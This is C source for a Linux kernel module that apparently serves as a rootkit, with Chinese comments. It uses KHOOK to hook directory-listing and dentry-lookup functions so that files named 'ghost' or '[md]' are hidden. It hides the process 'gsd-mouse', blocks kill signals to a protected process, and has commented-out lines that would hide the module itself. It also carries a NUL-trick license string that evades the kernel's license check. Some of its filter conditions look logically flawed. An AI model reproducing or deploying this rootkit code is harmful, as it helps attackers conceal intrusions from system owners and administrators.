#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/string.h>
#include "khook/engine.c"

////////////////////////////////////////////////////////////////////////////////
// An example of using KHOOK
////////////////////////////////////////////////////////////////////////////////
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/version.h>
#include <linux/syscalls.h>
#include <linux/sched.h>
#include <linux/list.h>
#include <linux/init.h>
#include <asm/unistd.h>
#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/compiler_types.h>



#define FLAG 0x80000000
const char *protected = "[md]";
int protected_pid = -1;
int hide_pid = -1;
const char *hide = "gsd-mouse";


// int myatoi(char *str)
// {
// 　　int res = 0;
// 　　int mul = 1;
// 　　char *ptr;
// 　　for (ptr = str + strlen(str) - 1; ptr >= str; ptr--) {
// 	　　if (*ptr < '0' || *ptr > '9') return (-1);
// 	　　res += (*ptr - '0') * mul;
// 	　　mul *= 10;
// 　　}
// 　　return (res);
// }

// static inline char *get_name(struct task_struct *p, char *buf)
// 　　{
// 　　int i;
// 　　char *name;
// 　　name = p->comm;
// 　　i = sizeof(p->comm);
// 　　do {
// 　　unsigned char c = *name;
// 　　name++;
// 　　i--;
// 　　*buf = c;
// 　　if (!c)
// 　　break;
// 　　if (c == '\\') {
// 　　buf[1] = c;
// 　　buf += 2;
// 　　continue;
// 　　}
// 　　if (c == '\n') {
// 　　buf[0] = '\\';
// 　　buf[1] = 'n';
// 　　buf += 2;
// 　　continue;
// 　　}
// 　　buf++;
// 　　}
// 　　while (i);
// 　　*buf = '\n';
// 　　return buf + 1;
// 　　}

// int get_process(pid_t pid) 
// {
// 　　struct task_struct *task = get_task(pid);
// 　　char *buffer[64] = {0};
// 　　if (task)
// 　　{
// 　　	get_name(task, buffer);
// 　　	if(strstr(buffer,protected))	return 1;  //比较protected 和目录下的进程名
// 	　　else return 0;
// 　　}
// 　　else
// 　　	return 0;
// }

// struct *task_struct get_task(pid_t pid)
// 　{
// 　　struct task_struct *p = get_current(),*entry=NULL;
// 　　list_for_each_entry(entry,&(p->tasks),tasks)
// 　　{
// 	　　if(entry->pid == pid)
// 	　　{
// 	　　printk("pid found\n");
// 	　　return entry;
// 	　　}
// 　　}
// 　　return NULL;
// 　}

static int print_pid(void)
{
	struct task_struct * task, * p;
	struct list_head * pos;
	int count = 0;
	printk("Hello World enter begin:\n");
	task =& init_task;
	list_for_each(pos, &task->tasks)
	{
		p = list_entry(pos, struct task_struct, tasks);
		count++;
		printk("%d---------->%s\n", p->pid, p->comm);
	}
	printk("the number of process is: %d\n", count);
	return 0;
}

static pid_t find_pid_kill(void)
{
	struct task_struct * task, * p;
	struct list_head * pos;
	int count = 0;
	task =& init_task;
	list_for_each(pos, &task->tasks)
	{
		p = list_entry(pos, struct task_struct, tasks);
		count++;
		if (strstr(p->comm, protected))
			protected_pid = p->pid;
	}
	return 0;
}

static pid_t find_pid_hide(void)
{
	struct task_struct * task, * p;
	struct list_head * pos;
	int count = 0;
	task =& init_task;
	list_for_each(pos, &task->tasks)
	{
		p = list_entry(pos, struct task_struct, tasks);
		count++;
		if (strstr(p->comm, hide))
			hide_pid = p->pid;
	}
	return 0;
}

KHOOK_EXT(int, fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_fillonedir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = 0;
	
	if (!strstr(name, "ghost") || !strstr(name,protected))
		ret = KHOOK_ORIGIN(fillonedir, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

KHOOK_EXT(int, filldir, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_filldir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
{
	char *endp;
	long pid;
	int ret = 0;
	find_pid_hide();
	pid = simple_strtol(name, &endp, 10);
	if (pid != hide_pid || !strstr(name, "ghost")|| !strstr(name,protected))
		ret = KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

KHOOK_EXT(int, filldir64, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_filldir64(void *__buf, const char *name, int namlen,
			   loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = 0;
	if (!strstr(name, "ghost")|| !strstr(name,protected))
		ret = KHOOK_ORIGIN(filldir64, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

KHOOK_EXT(int, compat_fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_compat_fillonedir(void *__buf, const char *name, int namlen,
				   loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = 0;
	if (!strstr(name, "ghost")|| !strstr(name,protected))
		ret = KHOOK_ORIGIN(compat_fillonedir, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 12, 0)
KHOOK_EXT(int, compat_filldir64, void *buf, const char *, int, loff_t, u64, unsigned int);
static int khook_compat_filldir64(void *__buf, const char *name, int namlen,
				  loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = 0;
	if (!strstr(name, "ghost")|| !strstr(name,protected))
		ret = KHOOK_ORIGIN(compat_filldir64, __buf, name, namlen, offset, ino, d_type);
	return ret;
}
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 9, 0)
KHOOK_EXT(struct dentry *, __d_lookup, const struct dentry *, const struct qstr *);
struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *name)
#else
KHOOK_EXT(struct dentry *, __d_lookup, struct dentry *, struct qstr *);
struct dentry *khook___d_lookup(struct dentry *parent, struct qstr *name)
#endif
{
	struct dentry *found = NULL;
	if (!strstr(name->name, "ghost")|| !strstr(name->name,protected))
		found = KHOOK_ORIGIN(__d_lookup, parent, name);
	return found;
}

KHOOK_EXT(long, sys_kill, pid_t, int);
static long khook_sys_kill(pid_t pid, int sig) {
	int ret = 0;
	find_pid_kill();
	printk("pid:%d", protected_pid);
	if (protected_pid != pid)
		ret = KHOOK_ORIGIN(sys_kill, pid, sig);
        //printk("sys_kill");
        //return KHOOK_ORIGIN(sys_kill, pid, sig);
	return ret;
}

// KHOOK_EXT(ssize_t, vfs_write, struct file *, char __user *, size_t, loff_t *);
// static ssize_t khook_vfs_write(struct file *file, char __user *buf, size_t count, loff_t *pos){
// 	ssize_t ret;
// 	ret = KHOOK_ORIGIN(vfs_write, file, buf, count, pos);
// 	return ret;
// }



/*KHOOK(find_task_by_vpid);
struct task_struct *khook_find_task_by_vpid(pid_t vnr)
{
	struct task_struct *tsk = NULL;
	tsk=KHOOK_ORIGIN(find_task_by_vpid, vnr);
	find_pid();
	printk("pid:%d", protected_pid);
	if(protected_pid==vnr) tsk=NULL; 
	return tsk;
}*/


// KHOOK_EXT(struct task_struct *, find_task_by_vpid, pid_t);
// static task_struct *khook_find_task_by_vpid(pid_t vnr){
// 	struct task_struct *tsk = NULL;
// 	tsk=KHOOK_ORIGIN(find_task_by_vpid, vnr);
// 	find_pid();
// 	printk("pid:%d", protected_pid);
// 	if(protected_pid==vnr) tsk=NULL; 
// 	return tsk;
// }

// KHOOK_EXT(long, sys_getdents, struct linux_dirent64 __user *, unsigned int);
// static long khook_sys_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count){
//  	long ret;
//  	ret = KHOOK_ORIGIN(sys_getdents,fd, dirp, count);
// 	return ret;
// 	long value=0;
// 　	struct inode *dinode;
// 　　int len = 0;
// 　　int tlen = 0;
// 　　struct linux_dirent64 *mydir = NULL;
// 　　//end
// 　　//在这里调用一下sys_getdents,得到返回的结果
// 　　value = (*orig_getdents) (fd, dirp, count);
// 　　tlen = value;
// 　　//遍历得到的目录列表
// 　　while(tlen > 0)
// 　　{
// 　　len = dirp->d_reclen;
// 　　tlen = tlen - len;
// 　　printk("%s\n",dirp->d_name);
// 　　//在proc文件系统中，目录名就是pid,我们再根据pid找到进程名
// 　　if(get_process(myatoi(dirp->d_name)) )
// 　　{
// 　　printk("find process\n");
// 　　//发现匹配的进程，调用memmove将这条进程覆盖掉
// 　　memmove(dirp, (char *) dirp + dirp->d_reclen, tlen);
// 　　value = value - len;
// 　　}
// 　　if(tlen)
// 　　dirp = (struct linux_dirent64 *) ((char *)dirp + dirp->d_reclen);
// 　　}　　
// }



/*
KHOOK_EXT(long, __x64_sys_kill, const struct pt_regs *);
static long khook___x64_sys_kill(const struct pt_regs *regs) {
        printk("sys_kill -- %s pid %ld sig %ld\n", current->comm, regs->di, regs->si);
        return KHOOK_ORIGIN(__x64_sys_kill, regs);
}*/



/*KHOOK(inode_permission);
static int khook_inode_permission(struct inode *inode, int mask)
{
	int ret = 0;
s
	ret = KHOOK_ORIGIN(inode_permission, inode, mask);
	printk("%s(%p, %08x) = %d\n", __func__, inode, mask, ret);

	return ret;
}*/

////////////////////////////////////////////////////////////////////////////////
// An example of using KHOOK_EXT
////////////////////////////////////////////////////////////////////////////////

/*#include <linux/binfmts.h>

KHOOK_EXT(int, load_elf_binary, struct linux_binprm *);
static int khook_load_elf_binary(struct linux_binprm *bprm)
{
	int ret = 0;

	ret = KHOOK_ORIGIN(load_elf_binary, bprm);
	printk("%s(%p) = %d\n", __func__, bprm, ret);

	return ret;
}*/

////////////////////////////////////////////////////////////////////////////////


int init_module(void)
{
	print_pid();
	//list_del_init(&__this_module.list);
	//kobject_del(&THIS_MODULE->mkobj.kobj);
	return khook_init();
}

void cleanup_module(void)
{
	khook_cleanup();
}

MODULE_LICENSE("GPL\0but who really cares?");
